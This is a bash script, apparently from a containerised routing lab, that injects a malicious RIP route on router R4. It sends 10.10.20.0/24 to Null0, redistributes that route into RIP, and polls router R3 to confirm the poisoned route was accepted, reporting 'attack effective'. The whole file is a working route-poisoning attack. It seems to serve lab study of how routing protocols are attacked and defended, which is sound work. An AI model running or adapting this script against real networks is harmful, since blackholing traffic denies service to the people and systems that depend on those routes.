#!/usr/bin/env bash
# poison-r4.sh — inject and verify the Phase 2 malicious route on R4
set -euo pipefail

POLL_TIMEOUT="${POLL_TIMEOUT:-20}"
POLL_INTERVAL="${POLL_INTERVAL:-2}"

log_ok()   { printf '[+] %s\n' "$*"; }
log_warn() { printf '[!] %s\n' "$*"; }
log_info() { printf '[i] %s\n' "$*"; }
log_err()  { printf '[X] %s\n' "$*" >&2; }

# 1. Inject poison on R4
log_info "Injecting poison on R4 (10.10.20.0/24 -> Null0, redistributed into RIP)..."
podman exec -i rip-r4 vtysh >/dev/null 2>&1 <<'EOF'
conf t
no ip route 10.10.20.0/24 Null0
ip route 10.10.20.0/24 Null0
router rip
 version 2
 redistribute static
end
EOF

# 2. Verify R4 has the static blackhole route (shell-level, no vtysh noise)
R4_ROUTE=$(podman exec rip-r4 ip route show 10.10.20.0/24 2>/dev/null || true)
if echo "$R4_ROUTE" | grep -q "blackhole"; then
    log_ok "R4 has the static blackhole route (setup verified)"
else
    log_err "R4 does NOT have 10.10.20.0/24 -> Null0. Poison injection FAILED."
    echo "$R4_ROUTE" | sed 's/^/    /' >&2
    exit 1
fi

# 3. Verify R4 advertises it into RIP (vtysh stderr suppressed)
R4_RIP=$(podman exec rip-r4 vtysh -c "show ip rip" 2>/dev/null || true)
if echo "$R4_RIP" | grep -q "10.10.20.0/24"; then
    log_ok "R4 advertises 10.10.20.0/24 into RIP"
    R4_ADV="OK"
else
    log_warn "R4 does not yet show 10.10.20.0/24 in 'show ip rip' — will re-check"
    R4_ADV="NOT YET VISIBLE"
fi

# 4. Poll R3 for the attack outcome
log_info "Polling R3 for the poisoned route (up to ${POLL_TIMEOUT}s)..."
PROPAGATED=0
R3_ROUTE=""
MAX_TRIES=$(( POLL_TIMEOUT / POLL_INTERVAL ))
for _ in $(seq 1 "$MAX_TRIES"); do
    R3_ROUTE=$(podman exec rip-r3 vtysh -c "show ip route 10.10.20.0/24" 2>/dev/null || true)
    if echo "$R3_ROUTE" | grep -q "172.16.140.3"; then
        PROPAGATED=1
        break
    fi
    sleep "$POLL_INTERVAL"
done

R4_RIP=$(podman exec rip-r4 vtysh -c "show ip rip" 2>/dev/null || true)
echo "$R4_RIP" | grep -q "10.10.20.0/24" && R4_ADV="OK"

# 5. Final status
echo
echo "===== POISON STATUS ====="
printf '  R4 static route:       %s\n' "OK"
printf '  R4 RIP advertisement:  %s\n' "$R4_ADV"
if [ "$PROPAGATED" -eq 1 ]; then
    printf '  R3 acceptance:         YES  (attack effective)\n'
    echo "$R3_ROUTE" | sed 's/^/    /'
else
    printf '  R3 acceptance:         NO   (route blocked or not converged)\n'
fi
echo
log_ok "Poison injection complete."